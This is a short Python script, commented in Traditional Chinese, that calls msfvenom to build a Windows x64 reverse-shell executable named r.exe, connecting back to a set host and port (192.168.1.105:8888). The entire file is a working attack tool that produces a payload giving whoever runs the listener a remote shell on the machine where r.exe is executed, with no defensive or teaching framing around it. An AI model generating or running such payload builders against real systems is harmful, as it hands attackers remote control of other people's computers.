import subprocess

def generate_payload(lhost, lport, output_file):
    # msfvenom 命令
    cmd = [
        "msfvenom",
        "-p", "windows/x64/shell_reverse_tcp",  # 載荷類型
        f"LHOST={lhost}",                      # 反向連接 IP
        f"LPORT={lport}",                      # 反向連接端口
        "-f", "exe",                           # 輸出格式
        "-o", output_file                      # 輸出文件名
    ]

    try:
        print(f"執行指令：{' '.join(cmd)}")
        # 執行命令
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        print("Payload 生成成功！")
        print("輸出：", result.stdout)
    except subprocess.CalledProcessError as e:
        print("生成 Payload 時發生錯誤：")
        print(e.stderr)

# 使用範例
lhost = "192.168.1.105"
lport = "8888"
output_file = "r.exe"

generate_payload(lhost, lport, output_file)

